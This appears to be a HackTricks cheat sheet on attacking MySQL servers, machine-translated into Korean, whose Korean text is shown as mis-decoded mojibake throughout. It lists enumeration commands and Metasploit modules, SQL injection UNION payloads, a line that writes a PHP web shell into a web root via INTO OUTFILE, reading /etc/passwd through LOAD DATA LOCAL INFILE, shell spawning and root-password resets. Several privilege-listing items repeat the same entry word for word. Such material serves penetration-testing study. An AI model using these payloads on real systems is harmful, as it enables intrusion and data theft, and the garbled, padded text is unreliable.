# 3306 - Pentesting Mysql

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„**í•˜ê¸° ìœ„í•œ ë¯¸ì…˜ì„ ê°€ì§€ê³  ìˆìœ¼ë©°, ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì˜ ë“ëŠ” ë§Œë‚¨ ì§€ì ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## **ê¸°ë³¸ ì •ë³´**

**MySQL**ëŠ” ë¹„ìš©ì´ ì—†ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ **ê´€ê³„í˜• ë°ì´í„°ë² ì´ìŠ¤ ê´€ë¦¬ ì‹œìŠ¤í…œ (RDBMS)**ë¡œì„œ **Structured Query Language (SQL)**ì—ì„œ ì‘ë™í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ê´€ë¦¬ ë° ì¡°ì‘ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 3306
```
3306/tcp open  mysql
```
## **ì—°ê²°**

### **ë¡œì»¬**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### ì›ê²©

MySQL can be accessed remotely through the network. This can be a potential security risk if proper precautions are not taken. In this section, we will discuss some techniques for pentesting remote MySQL services.

MySQLì€ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ì›ê²©ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì ì ˆí•œ ì˜ˆë°© ì¡°ì¹˜ë¥¼ ì·¨í•˜ì§€ ì•Šìœ¼ë©´ ì´ëŠ” ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì„¹ì…˜ì—ì„œëŠ” ì›ê²© MySQL ì„œë¹„ìŠ¤ì˜ íœí…ŒìŠ¤íŒ… ê¸°ë²•ì— ëŒ€í•´ ë…¼ì˜í•˜ê² ìŠµë‹ˆë‹¤.

#### Default Port

By default, MySQL listens on port 3306. This is the port that clients use to connect to the MySQL server. During a pentest, it is important to identify the port on which the MySQL service is running.

ê¸°ë³¸ì ìœ¼ë¡œ MySQLì€ 3306 í¬íŠ¸ì—ì„œ ìˆ˜ì‹  ëŒ€ê¸°í•©ë‹ˆë‹¤. ì´ëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ MySQL ì„œë²„ì— ì—°ê²°í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” í¬íŠ¸ì…ë‹ˆë‹¤. íœí…ŒìŠ¤íŠ¸ ì¤‘ì—ëŠ” MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í¬íŠ¸ë¥¼ ì‹ë³„í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

#### Banner Grabbing

Banner grabbing is a technique used to gather information about a service by analyzing the banner or response message sent by the service. This can be useful for identifying the version of MySQL running on the remote server.

ë°°ë„ˆ ê·¸ë˜ë¹™ì€ ì„œë¹„ìŠ¤ê°€ ë³´ë‚´ëŠ” ë°°ë„ˆ ë˜ëŠ” ì‘ë‹µ ë©”ì‹œì§€ë¥¼ ë¶„ì„í•˜ì—¬ ì„œë¹„ìŠ¤ì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. ì´ëŠ” ì›ê²© ì„œë²„ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ MySQL ë²„ì „ì„ ì‹ë³„í•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Enumeration

Enumeration is the process of gathering information about a target system. In the context of MySQL pentesting, enumeration involves identifying the databases, tables, and columns present on the remote server. This can be done using various techniques such as brute-forcing, SQL injection, or using built-in MySQL commands.

ì—´ê±°ëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ê³¼ì •ì…ë‹ˆë‹¤. MySQL íœí…ŒìŠ¤íŒ…ì˜ ê²½ìš°, ì—´ê±°ëŠ” ì›ê²© ì„œë²„ì— ìˆëŠ” ë°ì´í„°ë² ì´ìŠ¤, í…Œì´ë¸” ë° ì—´ì„ ì‹ë³„í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŠ” ë¸Œë£¨íŠ¸ í¬ì‹±, SQL ì¸ì ì…˜ ë˜ëŠ” ë‚´ì¥ëœ MySQL ëª…ë ¹ì„ ì‚¬ìš©í•˜ëŠ” ë“± ë‹¤ì–‘í•œ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Brute-Forcing

Brute-forcing is a technique used to guess passwords by systematically trying all possible combinations until the correct one is found. In the context of MySQL pentesting, brute-forcing can be used to guess the password for the MySQL user accounts.

ë¸Œë£¨íŠ¸ í¬ì‹±ì€ ì˜¬ë°”ë¥¸ ë¹„ë°€ë²ˆí˜¸ê°€ ë°œê²¬ë  ë•Œê¹Œì§€ ê°€ëŠ¥í•œ ëª¨ë“  ì¡°í•©ì„ ì²´ê³„ì ìœ¼ë¡œ ì‹œë„í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. MySQL íœí…ŒìŠ¤íŒ…ì˜ ê²½ìš°, ë¸Œë£¨íŠ¸ í¬ì‹±ì€ MySQL ì‚¬ìš©ì ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### SQL Injection

SQL injection is a technique used to exploit vulnerabilities in a web application's database layer. In the context of MySQL pentesting, SQL injection can be used to execute arbitrary SQL queries on the remote MySQL server.

SQL ì¸ì ì…˜ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë°ì´í„°ë² ì´ìŠ¤ ë ˆì´ì–´ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. MySQL íœí…ŒìŠ¤íŒ…ì˜ ê²½ìš°, SQL ì¸ì ì…˜ì€ ì›ê²© MySQL ì„œë²„ì—ì„œ ì„ì˜ì˜ SQL ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Privilege Escalation

Privilege escalation is the process of gaining higher privileges on a system or application. In the context of MySQL pentesting, privilege escalation can involve gaining administrative access to the MySQL server or obtaining higher privileges within the MySQL database.

ê¶Œí•œ ìƒìŠ¹ì€ ì‹œìŠ¤í…œ ë˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë” ë†’ì€ ê¶Œí•œì„ ì–»ëŠ” ê³¼ì •ì…ë‹ˆë‹¤. MySQL íœí…ŒìŠ¤íŒ…ì˜ ê²½ìš°, ê¶Œí•œ ìƒìŠ¹ì€ MySQL ì„œë²„ì— ëŒ€í•œ ê´€ë¦¬ ê¶Œí•œ íšë“ì´ë‚˜ MySQL ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì—ì„œ ë” ë†’ì€ ê¶Œí•œ íšë“ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## ì™¸ë¶€ ì—´ê±°

ì¼ë¶€ ì—´ê±° ì‘ì—…ì€ ìœ íš¨í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤.
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**](../generic-methodologies-and-resources/brute-force.md#mysql)

### ì´ì§„ ë°ì´í„° ì‘ì„±í•˜ê¸°
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL ëª…ë ¹ì–´**

MySQL is a popular open-source relational database management system. It is widely used in web applications and is known for its speed and reliability. In this section, we will explore some commonly used MySQL commands for database management and manipulation.

### **Connecting to MySQL**

To connect to a MySQL database, you can use the following command:

```bash
mysql -h <host> -u <username> -p
```

Replace `<host>` with the hostname or IP address of the MySQL server, `<username>` with the username, and `<password>` with the password.

### **Creating a Database**

To create a new database, use the `CREATE DATABASE` command:

```sql
CREATE DATABASE <database_name>;
```

Replace `<database_name>` with the desired name for the database.

### **Selecting a Database**

To select a database to work with, use the `USE` command:

```sql
USE <database_name>;
```

Replace `<database_name>` with the name of the database you want to select.

### **Creating a Table**

To create a new table in a database, use the `CREATE TABLE` command:

```sql
CREATE TABLE <table_name> (
    <column1_name> <column1_type>,
    <column2_name> <column2_type>,
    ...
);
```

Replace `<table_name>` with the desired name for the table, `<column1_name>` with the name of the first column, `<column1_type>` with the data type of the first column, and so on.

### **Inserting Data**

To insert data into a table, use the `INSERT INTO` command:

```sql
INSERT INTO <table_name> (<column1_name>, <column2_name>, ...)
VALUES (<value1>, <value2>, ...);
```

Replace `<table_name>` with the name of the table, `<column1_name>` and `<column2_name>` with the names of the columns you want to insert data into, and `<value1>`, `<value2>`, etc. with the corresponding values.

### **Querying Data**

To retrieve data from a table, use the `SELECT` command:

```sql
SELECT <column1_name>, <column2_name>, ...
FROM <table_name>
WHERE <condition>;
```

Replace `<column1_name>`, `<column2_name>`, etc. with the names of the columns you want to retrieve, `<table_name>` with the name of the table, and `<condition>` with the condition that the data must meet.

### **Updating Data**

To update data in a table, use the `UPDATE` command:

```sql
UPDATE <table_name>
SET <column1_name> = <new_value1>, <column2_name> = <new_value2>, ...
WHERE <condition>;
```

Replace `<table_name>` with the name of the table, `<column1_name>`, `<column2_name>`, etc. with the names of the columns you want to update, `<new_value1>`, `<new_value2>`, etc. with the new values, and `<condition>` with the condition that the data must meet.

### **Deleting Data**

To delete data from a table, use the `DELETE FROM` command:

```sql
DELETE FROM <table_name>
WHERE <condition>;
```

Replace `<table_name>` with the name of the table and `<condition>` with the condition that the data must meet.

### **Dropping a Database**

To drop a database, use the `DROP DATABASE` command:

```sql
DROP DATABASE <database_name>;
```

Replace `<database_name>` with the name of the database you want to drop.

These are just a few examples of the many commands available in MySQL. By mastering these commands, you will be able to perform various tasks related to database management and manipulation.
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQL ê¶Œí•œ ì—´ê±°

MySQL ë°ì´í„°ë² ì´ìŠ¤ì— ëŒ€í•œ ê¶Œí•œ ì—´ê±°ëŠ” ì‹œìŠ¤í…œì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤. ë‹¤ìŒì€ MySQL ê¶Œí•œì„ ì—´ê±°í•˜ëŠ” ëª‡ ê°€ì§€ ë°©ë²•ì…ë‹ˆë‹¤.

#### 1. SHOW GRANTS ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR 'username'@'localhost';
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 'username'ì€ í™•ì¸í•˜ë ¤ëŠ” ì‚¬ìš©ìì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### 2. INFORMATION_SCHEMA ì‚¬ìš©

```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%username%';
```

ìœ„ì˜ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 'username'ì€ í™•ì¸í•˜ë ¤ëŠ” ì‚¬ìš©ìì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### 3. mysql.user í…Œì´ë¸” ì‚¬ìš©

```sql
SELECT * FROM mysql.user WHERE User='username'\G
```

ìœ„ì˜ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 'username'ì€ í™•ì¸í•˜ë ¤ëŠ” ì‚¬ìš©ìì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### 4. SHOW PRIVILEGES ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW PRIVILEGES;
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ MySQL ì„œë²„ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ëª¨ë“  ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 5. mysql.db í…Œì´ë¸” ì‚¬ìš©

```sql
SELECT * FROM mysql.db WHERE User='username'\G
```

ìœ„ì˜ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ì‚¬ìš©ìê°€ íŠ¹ì • ë°ì´í„°ë² ì´ìŠ¤ì— ëŒ€í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 'username'ì€ í™•ì¸í•˜ë ¤ëŠ” ì‚¬ìš©ìì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### 6. SHOW GRANTS FOR CURRENT_USER() ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR CURRENT_USER();
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 7. SHOW GRANTS FOR CURRENT_USER ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR CURRENT_USER;
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 8. SHOW GRANTS FOR CURRENT_USER ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR CURRENT_USER;
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 9. SHOW GRANTS FOR CURRENT_USER ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR CURRENT_USER;
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 10. SHOW GRANTS FOR CURRENT_USER ëª…ë ¹ì–´ ì‚¬ìš©

```sql
SHOW GRANTS FOR CURRENT_USER;
```

ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
ë¬¸ì„œì—ì„œ ê° ê¶Œí•œì˜ ì˜ë¯¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQL íŒŒì¼ RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## í´ë¼ì´ì–¸íŠ¸ì— ì˜í•œ MySQL ì„ì˜ íŒŒì¼ ì½ê¸°

ì‹¤ì œë¡œ, **ë¡œì»¬ ë°ì´í„°ë¥¼ í…Œì´ë¸”ë¡œ ë¡œë“œ**í•  ë•Œ MySQL ë˜ëŠ” MariaDB ì„œë²„ëŠ” **í´ë¼ì´ì–¸íŠ¸ì—ê²Œ íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ê³  ë‚´ìš©ì„ ë³´ë‚´ë„ë¡ ìš”ì²­**í•©ë‹ˆë‹¤. **ë”°ë¼ì„œ, mysql í´ë¼ì´ì–¸íŠ¸ë¥¼ ì¡°ì‘í•˜ì—¬ ìì²´ MySQL ì„œë²„ì— ì—°ê²°í•˜ë©´ ì„ì˜ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ì´ëŠ” ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ë™ì‘í•˜ëŠ” ê²ƒì— ìœ ì˜í•˜ì„¸ìš”:
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(ì£¼ì˜: "local"ì´ë¼ëŠ” ë‹¨ì–´ë¥¼ ì°¸ê³ í•˜ì„¸ìš”)\
"local" ì—†ì´ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**ì´ˆê¸° PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**ì´ ë…¼ë¬¸ì—ì„œëŠ” ê³µê²©ì— ëŒ€í•œ ì™„ì „í•œ ì„¤ëª…ê³¼ ì‹¬ì§€ì–´ RCEë¡œ í™•ì¥í•˜ëŠ” ë°©ë²•ê¹Œì§€ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**ì—¬ê¸°ì—ì„œëŠ” ê³µê²©ì— ëŒ€í•œ ê°œìš”ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ìˆëŠ” ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql ì‚¬ìš©ì

ë§Œì•½ mysqlì´ **root**ë¡œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ ë§¤ìš° í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤:
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### mysqld.cnfì˜ ìœ„í—˜í•œ ì„¤ì •

MySQL ì„œë¹„ìŠ¤ì˜ êµ¬ì„±ì—ì„œ ë‹¤ì–‘í•œ ì„¤ì •ì´ ì‚¬ìš©ë˜ì–´ ì‘ë™ ë° ë³´ì•ˆ ì¡°ì¹˜ê°€ ì •ì˜ë©ë‹ˆë‹¤:

- **`user`** ì„¤ì •ì€ MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ë  ì‚¬ìš©ìë¥¼ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
- **`password`**ëŠ” MySQL ì‚¬ìš©ìì™€ ê´€ë ¨ëœ ì•”í˜¸ë¥¼ ì„¤ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
- **`admin_address`**ëŠ” ê´€ë¦¬ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ TCP/IP ì—°ê²°ì„ ìˆ˜ì‹ í•˜ëŠ” IP ì£¼ì†Œë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
- **`debug`** ë³€ìˆ˜ëŠ” í˜„ì¬ ë””ë²„ê¹… êµ¬ì„±ì„ ë‚˜íƒ€ë‚´ë©° ë¡œê·¸ì— ë¯¼ê°í•œ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
- **`sql_warnings`**ëŠ” ê²½ê³ ê°€ ë°œìƒí•  ë•Œ ë‹¨ì¼ í–‰ INSERT ë¬¸ì— ëŒ€í•œ ì •ë³´ ë¬¸ìì—´ì´ ìƒì„±ë˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ê´€ë¦¬í•˜ë©° ë¡œê·¸ì— ë¯¼ê°í•œ ë°ì´í„°ê°€ í¬í•¨ë©ë‹ˆë‹¤.
- **`secure_file_priv`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„° ê°€ì ¸ì˜¤ê¸° ë° ë‚´ë³´ë‚´ê¸° ì‘ì—…ì˜ ë²”ìœ„ë¥¼ ì œí•œí•˜ì—¬ ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### ê¶Œí•œ ìƒìŠ¹
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í†µí•œ ê¶Œí•œ ìƒìŠ¹

ë§Œì•½ **mysql ì„œë²„ê°€ rootë¡œ ì‹¤í–‰ ì¤‘**ì´ê±°ë‚˜ ë‹¤ë¥¸ ë” ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìë¡œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´, ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œëŠ” **ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  mysqlì„ ì‹¤í–‰ ì¤‘ì¸ ìš´ì˜ ì²´ì œì— í•„ìš”í•œ **ë¼ì´ë¸ŒëŸ¬ë¦¬**ë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤.

